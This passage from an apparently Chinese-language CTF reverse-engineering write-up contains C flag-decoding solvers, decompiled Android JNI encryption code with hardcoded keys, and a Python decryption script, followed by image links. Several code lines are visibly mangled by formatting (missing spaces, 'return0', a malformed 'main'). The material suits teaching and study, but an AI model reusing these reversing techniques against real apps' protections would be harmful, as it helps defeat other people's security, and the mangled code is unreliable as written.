        invmix4(st[off], st[off + 1], st[off + 2], st[off + 3], &a, &b, &c, &d);
        st[off] = a;
        st[off + 1] = b;
        st[off + 2] = c;
        st[off + 3] = d;
    }

    for (int i = 0; i < 16; i++)
    {
        st[i] = rol4(st[i]);
    }

    memcpy(result, st, 16);
}

// 打印字节数组为十六进制
void print_hex(const uint8_t *data, int len)
{
    for (int i = 0; i < len; i++)
    {
        printf("%02x", data[i]);
    }
}

// 打印字节数组为ASCII（可打印字符）
void print_ascii(const uint8_t *data, int len)
{
    for (int i = 0; i < len; i++)
    {
        if (data[i] >= 32 && data[i] < 127)
        {
            printf("%c", data[i]);
        }
        else
        {
            printf("\x%02x", data[i]);
        }
    }
}

int main()
{
    uint8_t p0[16], p1[16];
    uint8_t payload[32];

    F_decrypt_block(TARGET, p0);
    F_decrypt_block(TARGET + 16, p1);
    
    memcpy(payload, p0, 16);
    memcpy(payload + 16, p1, 16);

    printf("flag{");
    print_ascii(payload, 32);
    printf("}n");

    return0;
}
    #include <stdint.h>
    #include <string.h>
int main{

char aaaa[]={"abcdefghijklmnopqrstuvwxyabcdef"};
    unsignedchar cao[] =
            {
                    0xA8, 0x5E, 0x6A, 0xEF, 0x14, 0x4A, 0xCA, 0x66, 0xA0, 0x91,
                    0xCC, 0x70, 0x4E, 0x43, 0xF6, 0x07, 0x6D, 0xF2, 0xF4, 0x50,
                    0x74, 0xE9, 0xAC, 0xFE, 0xB0, 0x02, 0x72, 0xA0, 0x1D, 0xD8,
                    0xA1
            };

    unsignedchar aa[] =
            {
                    0xAF, 0x50, 0x68, 0xEC, 0x0A, 0x4F, 0x9F, 0x6F, 0xA7, 0xA4,
                    0xC4, 0x2F, 0x4D, 0x48, 0xAD, 0x13, 0x79, 0xDF, 0xE4, 0x45,
                    0x73, 0xFA, 0xEF, 0xA7, 0xF6, 0x1E
            };

    for(int i=0;i<26;i++){
        printf("%c",aa[i]^cao[i]^aaaa[i]);
    }
    printf("n");
    return0；
    }
__int64 __fastcall Java_com_example_verifyVIN_VinInputActivity_encrypt(__int64 a1, __int64 a2, __int64 a3)
{
constchar *s; // r15
size_t n0x17; // rax
size_t n; // r12
char *dest_1; // r13
  __int64 v8; // rbp
  __int64 v9; // rcx
char *ptr_1; // rsi
  __int64 v11; // r12
unsigned __int8 v13; // [rsp+0h] [rbp-98h] BYREF
char v14; // [rsp+1h] [rbp-97h] BYREF
  __int64 v15; // [rsp+8h] [rbp-90h]
void *ptr; // [rsp+10h] [rbp-88h]
  _BYTE v17[16]; // [rsp+18h] [rbp-80h] BYREF
void *ptr_2; // [rsp+28h] [rbp-70h]
void *__MySecretKey123_@_[3]; // [rsp+30h] [rbp-68h] BYREF
  _QWORD dest[2]; // [rsp+48h] [rbp-50h] BYREF
void *ptr_3; // [rsp+58h] [rbp-40h]
unsigned __int64 v22; // [rsp+60h] [rbp-38h]

  v22 = __readfsqword(0x28u);
  s = (constchar *)(*(__int64 (__fastcall **)(__int64, __int64, _QWORD))(*(_QWORD *)a1 + 1352LL))(a1, a3, 0LL);
  n0x17 = strlen(s);
if ( n0x17 >= 0xFFFFFFFFFFFFFFF0LL )
    sub_61F70(dest);
  n = n0x17;
if ( n0x17 >= 0x17 )
  {
    v8 = n0x17 | 0xF;
    dest_1 = (char *)operatornew((n0x17 | 0xF) + 1);
    ptr_3 = dest_1;
    dest[0] = v8 + 2;
    dest[1] = n;
    goto LABEL_6;
  }
  LOBYTE(dest[0]) = 2 * n0x17;
  dest_1 = (char *)dest + 1;
if ( n0x17 )
LABEL_6:
    memmove(dest_1, s, n);
  dest_1[n] = 0;
  __android_log_print(4LL, "NativeLib", "Encrypting input: %s", s);
strcpy((char *)__MySecretKey123_@_, ""MySecretKey123!@#");
  enhancedEncrypt(v17, dest, __MySecretKey123_@_);
  bytesToHex(&v13, v17);
if ( (v13 & 1) != 0 )
    v9 = v15;
else
    v9 = v13 >> 1;
  __android_log_print(4LL, "NativeLib", "Encryption successful, output length: %zu", v9);
  (*(void (__fastcall **)(__int64, __int64, constchar *))(*(_QWORD *)a1 + 1360LL))(a1, a3, s);
if ( (v13 & 1) != 0 )
    ptr_1 = (char *)ptr;
else
    ptr_1 = &v14;
  v11 = (*(__int64 (__fastcall **)(__int64, char *))(*(_QWORD *)a1 + 1336LL))(a1, ptr_1);
if ( (v13 & 1) != 0 )
    operator delete(ptr);
if ( (v17[0] & 1) != 0 )
    operator delete(ptr_2);
if ( ((__int64)__MySecretKey123_@_[0] & 1) != 0 )
    operator delete(__MySecretKey123_@_[2]);
if ( (dest[0] & 1) != 0 )
    operator delete(ptr_3);
return v11;
}
unsigned __int8 *__fastcall enhancedEncrypt(unsigned __int8 *a1, __int64 a2, unsigned __int8 *a3)
{
  __int64 v5; // rdx
unsigned __int8 *v6; // rsi
  __int64 v7; // rdx
unsigned __int8 v8; // al
  __int64 v9; // rcx
bool v10; // r9
unsigned __int64 v11; // rcx
unsigned __int64 v12; // r8
unsigned __int8 *v13; // r8
unsigned __int64 v14; // r11
unsigned __int64 v15; // rdx
char *ptr_1; // rax
bool v17; // r9
  __int64 v18; // rcx
unsigned __int64 v19; // rcx
unsigned __int64 v20; // r8
unsigned __int8 *v21; // r8
unsigned __int64 v22; // r11
unsigned __int64 v23; // rdx
char *ptr_2; // rax
bool v25; // al
  __int64 v26; // rcx
unsigned __int64 v27; // rcx
unsigned __int64 v28; // rdx
unsigned __int8 *v29; // r8
unsigned __int64 v30; // r11
unsigned __int64 v31; // rdx
char *ptr_3; // rax
unsignedint v33; // edx
  __int128 v35; // [rsp+0h] [rbp-78h] BYREF
void *ptr_4; // [rsp+10h] [rbp-68h]
void *__AndroidNative2024[3]; // [rsp+18h] [rbp-60h] BYREF
  __int128 v38; // [rsp+30h] [rbp-48h] BYREF
void *ptr; // [rsp+40h] [rbp-38h]
unsigned __int64 v40; // [rsp+48h] [rbp-30h]

  v40 = __readfsqword(0x28u);
if ( (*a3 & 1) != 0 )
  {
    sub_61F00(&v38, *((_QWORD *)a3 + 2), *((_QWORD *)a3 + 1));
  }
else
  {
    ptr = (void *)*((_QWORD *)a3 + 2);
    v38 = *(_OWORD *)a3;
  }
while ( (v38 & 1) == 0 || *((_QWORD *)&v38 + 1) <= 0xFFuLL )
  {
    v5 = *a3 >> 1;
    v6 = (unsigned __int8 *)*((_QWORD *)a3 + 2);
    if ( (*a3 & 1) != 0 )
      v5 = *((_QWORD *)a3 + 1);
    else
      v6 = a3 + 1;
    std::
string::
append(&v38, v6, v5);
  }
strcpy((char *)__AndroidNative2024, ""AndroidNative2024");
  sub_619A0(&v35, __AndroidNative2024, a2);
if ( (v35 & 1) != 0 )
  {
    sub_61F00(a1, ptr_4, *((_QWORD *)&v35 + 1));
  }
else
  {
    *((_QWORD *)a1 + 2) = ptr_4;
    *(_OWORD *)a1 = v35;
  }
  v7 = *((_QWORD *)a1 + 1);
  v8 = *a1;
  v9 = *a1 >> 1;
  v10 = (*a1 & 1) == 0;
if ( (*a1 & 1) != 0 )
    v9 = *((_QWORD *)a1 + 1);
if ( v9 )
  {
    v11 = 0LL;
    do
    {
      v13 = a1 + 1;
      if ( !v10 )
        v13 = (unsigned __int8 *)*((_QWORD *)a1 + 2);
      if ( (v38 & 1) != 0 )
        v14 = *((_QWORD *)&v38 + 1);
      else
        v14 = (unsigned __int8)v38 >> 1;
      if ( (v14 | v11) >> 32 )
        v15 = v11 % v14;
      else
        v15 = (unsignedint)v11 % (unsignedint)v14;
      ptr_1 = (char *)&v38 + 1;
      if ( (v38 & 1) != 0 )
        ptr_1 = (char *)ptr;
      v13[v11] = (ptr_1[v15] + v13[v11]) ^ (2 * ptr_1[v15]);
      ++v11;
      v8 = *a1;
      v12 = *a1 >> 1;
      v10 = (*a1 & 1) == 0;
      v7 = *((_QWORD *)a1 + 1);
      if ( (*a1 & 1) != 0 )
        v12 = *((_QWORD *)a1 + 1);
    }
    while ( v11 < v12 );
  }
  v17 = (v8 & 1) == 0;
  v18 = v8 >> 1;
if ( (v8 & 1) != 0 )
    v18 = v7;
if ( v18 )
  {
    v19 = 0LL;
    do
    {
      v21 = a1 + 1;
      if ( !v17 )
        v21 = (unsigned __int8 *)*((_QWORD *)a1 + 2);
      if ( (v38 & 1) != 0 )
        v22 = *((_QWORD *)&v38 + 1);
      else
        v22 = (unsigned __int8)v38 >> 1;
      if ( (v22 | v19) >> 32 )
        v23 = v19 % v22;
      else
        v23 = (unsignedint)v19 % (unsignedint)v22;
      ptr_2 = (char *)&v38 + 1;
      if ( (v38 & 1) != 0 )
        ptr_2 = (char *)ptr;
      v21[v19] = ((ptr_2[v23] + v21[v19]) ^ (2 * ptr_2[v23])) + 1;
      ++v19;
      v8 = *a1;
      v20 = *a1 >> 1;
      v17 = (*a1 & 1) == 0;
      v7 = *((_QWORD *)a1 + 1);
      if ( (*a1 & 1) != 0 )
        v20 = *((_QWORD *)a1 + 1);
    }
    while ( v19 < v20 );
  }
  LOBYTE(v26) = v8 >> 1;
  v25 = (v8 & 1) == 0;
  v26 = (unsigned __int8)v26;
if ( !v25 )
    v26 = v7;
if ( v26 )
  {
    v27 = 0LL;
    do
    {
      v29 = a1 + 1;
      if ( !v25 )
        v29 = (unsigned __int8 *)*((_QWORD *)a1 + 2);
      if ( (v38 & 1) != 0 )
        v30 = *((_QWORD *)&v38 + 1);
      else
        v30 = (unsigned __int8)v38 >> 1;
      if ( (v30 | v27) >> 32 )
        v31 = v27 % v30;
      else
        v31 = (unsignedint)v27 % (unsignedint)v30;
      ptr_3 = (char *)&v38 + 1;
      if ( (v38 & 1) != 0 )
        ptr_3 = (char *)ptr;
      v29[v27] = ((ptr_3[v31] + v29[v27]) ^ (2 * ptr_3[v31])) + 2;
      v33 = *a1;
      v25 = (v33 & 1) == 0;
      if ( (v33 & 1) != 0 )
        v28 = *((_QWORD *)a1 + 1);
      else
        v28 = v33 >> 1;
      ++v27;
    }
    while ( v27 < v28 );
  }
if ( (v35 & 1) == 0 )
  {
    if ( ((__int64)__AndroidNative2024[0] & 1) == 0 )
      goto LABEL_67;
LABEL_71:
    operator delete(__AndroidNative2024[2]);
    if ( (v38 & 1) == 0 )
      return a1;
    goto LABEL_68;
  }
operator delete(ptr_4);
if ( ((__int64)__AndroidNative2024[0] & 1) != 0 )
    goto LABEL_71;
LABEL_67:
if ( (v38 & 1) != 0 )
LABEL_68:
    operator delete(ptr);
return a1;
}
_QWORD *__fastcall sub_619A0(_QWORD *a1, unsigned __int8 *a2, unsigned __int8 *a3)
{
unsigned __int8 *v3; // r14
unsignedint v4; // ecx
size_t n; // r12
unsignedint v6; // eax
size_t n_1; // r15
unsigned __int64 n0x16; // rbp
char v9; // bp
  __int64 dest_2; // rax
char v11; // r13
char *dest; // r13
constvoid *src; // rsi
char *dest_1; // r13
constvoid *src_1; // r14
unsigned __int8 v17; // [rsp+4h] [rbp-44h]

  v3 = a3;
  v4 = *a2;
if ( (v4 & 1) != 0 )
    n = *((_QWORD *)a2 + 1);
else
    n = v4 >> 1;
  v6 = *a3;
if ( (v6 & 1) != 0 )
    n_1 = *((_QWORD *)a3 + 1);
else
    n_1 = v6 >> 1;
  n0x16 = n_1 + n;
if ( n_1 + n >= 0xFFFFFFFFFFFFFFF0LL )
    sub_61F70(a1);
  v17 = *a3;
if ( n0x16 > 0x16 )
  {
    v11 = *a2;
    dest_2 = operatornew((n0x16 | 0xF) + 1);
    LOBYTE(v4) = v11;
    *a1 = (n0x16 | 0xF) + 2;
    a1[2] = dest_2;
    a1[1] = n0x16;
    v9 = (n0x16 | 0xF) + 2;
    v3 = a3;
  }
else
  {
    *(_OWORD *)a1 = 0LL;
    a1[2] = 0LL;
    v9 = 2 * n0x16;
    *(_BYTE *)a1 = v9;
    dest_2 = 0LL;
  }
  dest = (char *)a1 + 1;
if ( (v9 & 1) != 0 )
    dest = (char *)dest_2;
if ( n )
  {
    if ( (v4 & 1) != 0 )
      src = (constvoid *)*((_QWORD *)a2 + 2);
    else
      src = a2 + 1;
    memmove(dest, src, n);
  }
  dest_1 = &dest[n];
if ( n_1 )
  {
    if ( (v17 & 1) != 0 )
      src_1 = (constvoid *)*((_QWORD *)v3 + 2);
    else
      src_1 = v3 + 1;
    memmove(dest_1, src_1, n_1);
  }
  dest_1[n_1] = 0;
return a1;
}
def decrypt(encrypted_hex, key):
    # 将十六进制密文转换为字节
    encrypted_data = bytes.fromhex(encrypted_hex)
    key_bytes = key.encode()
    key_len = len(key_bytes)
    decrypted = bytearray()

    for i in range(len(encrypted_data)):

        stage3 = (encrypted_data[i] - 2) ^ (2 * key_bytes[i % key_len])
        stage3 -= key_bytes[i % key_len]
        stage3 &= 0xFF

        stage2 = (stage3 - 1) ^ (2 * key_bytes[i % key_len])
        stage2 -= key_bytes[i % key_len]
        stage2 &= 0xFF

        stage1 = (stage2 ^ (2 * key_bytes[i % key_len])) - key_bytes[i % key_len]
        stage1 &= 0xFF

        decrypted.append(stage1)

    return decrypted.decode(errors="ignore")

key = "MySecretKey123!@#"
encrypted_hex = "d506b266d52ec405cbd409a612e4dc75d2656a9114af2b1f2f83c071e2f0e2dd79dd"

plaintext = decrypt(encrypted_hex, key)
print("解密结果:", plaintext)
```


---
## 附图

![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2025/08/1754267775-wxsync-2025-08-c8f6831a6aab308230f099393c31bd52.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2025/08/1754267777-wxsync-2025-08-fb5821a3f6c118b877de78b83da623e4.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2025/08/1754267778-wxsync-2025-08-c251f5680db4eab170662369b12b9bc0.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2025/08/1754267781-wxsync-2025-08-fcae4c15de2a87750ab02490228cdfa8.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2025/08/1754267783-wxsync-2025-08-20165002165a5a235f6ffa8441e53700.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2025/08/1754267784-wxsync-2025-08-23ad2842190538db9b50bef964d9151d.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2025/08/1754267785-wxsync-2025-08-4f9442df97f91c8c6383a68e22d3e3d4.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2025/08/1754267787-wxsync-2025-08-aa36a04a831ee72366c4742839895aba.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2025/08/1754267789-wxsync-2025-08-c4c575fe9df9160d83e1a8648c961a98.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2025/08/1754267790-wxsync-2025-08-ce0c97848d3e7cd7b3556d1b28b3797b.png)